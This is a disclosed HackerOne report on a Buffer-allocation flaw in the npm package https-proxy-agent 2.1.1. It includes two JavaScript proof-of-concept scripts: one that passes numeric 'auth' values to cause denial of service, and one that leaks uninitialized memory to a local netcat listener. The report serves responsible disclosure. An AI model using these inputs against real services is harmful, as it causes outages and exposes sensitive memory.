# `https-proxy-agent` passes unsanitized options to Buffer(arg), resulting in DoS and uninitialized memory leak

## Report Details
- **Report ID**: 319532
- **URL**: https://hackerone.com/reports/319532
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-02-25T12:56:44.574Z
- **Disclosed**: 2018-04-02T20:49:07.192Z

## Reporter
- **Username**: chalker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a Buffer allocation vulnerability in `https-proxy-agent`.

In setups where `auth` argument is user-controlled, it allows to:
1. cause Denial of Service by trivially consuming all the available CPU resources
2. extract uninitialized memory chunks from the server on Node.js <8.x.

# Module

**module name:** https-proxy-agent
**version:** 2.1.1 
**npm page:** `https://www.npmjs.com/package/https-proxy-agent`

## Module Description

> This module provides an http.Agent implementation that connects to a specified HTTP or HTTPS proxy server, and can be used with the built-in https module.

## Module Stats

114 304 downloads in the last day
1 668 955 downloads in the last week
6 758 891 downloads in the last month

~81 106 692 estimated downloads per year

# Vulnerability

## Vulnerability Description

`https-proxy-agent` passes `auth` option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'auth' parameter (e.g. JSON).

The exact line: https://github.com/TooTallNate/node-https-proxy-agent/blob/2.1.1/index.js#L207

## Steps To Reproduce:

### DoS
```js
var url = require('url');
var https = require('https');
var HttpsProxyAgent = require('https-proxy-agent');

var proxy = {
  protocol: 'http:',
  host: "127.0.0.1",
  port: 8080
};

setInterval(() => {
  proxy.auth = 1e9; // a number as 'auth'
  var opts = url.parse('https://example.com/');
  var agent = new HttpsProxyAgent(proxy);
  opts.agent = agent;
  console.time('tick');
  https.get(opts);
  console.timeEnd('tick');
}, 200);
```

Observe how this is consuming memory and CPU — each request takes >1 second in the main thread on my setup.

### Uninitialized memory leak

```js
// listen with: nc -l -p 8080

var url = require('url');
var https = require('https');
var HttpsProxyAgent = require('https-proxy-agent');

var proxy = {
  protocol: 'http:',
  host: "127.0.0.1",
  port: 8080
};

proxy.auth = 500; // a number as 'auth'
var opts = url.parse('https://example.com/');
var agent = new HttpsProxyAgent(proxy);
opts.agent = agent;
https.get(opts);
```

Listen with `nl -l -p 8080` to see requests.

Execute on various Node.js versions — 4.x LTS, 6.x LTS, 8.x LTS / 9.x.

This leaks uninitialized Buffer memory on Node.js <8.x.
On ≥8.x those Buffers (that are using the deprecated API) are zero-filled.

## Supporting Material/References:

- OS: Arch Linux current
- Node.js 9.5.0
- npm 5.6.0
- gnu-netcat 0.7.1

# Wrap up

- I contacted the maintainer to let him know: N
- I opened an issue in the related repository: N

## Impact

Denial of service
Sensitive data leak (on Node.js <8.0)

## Attachments
No attachments
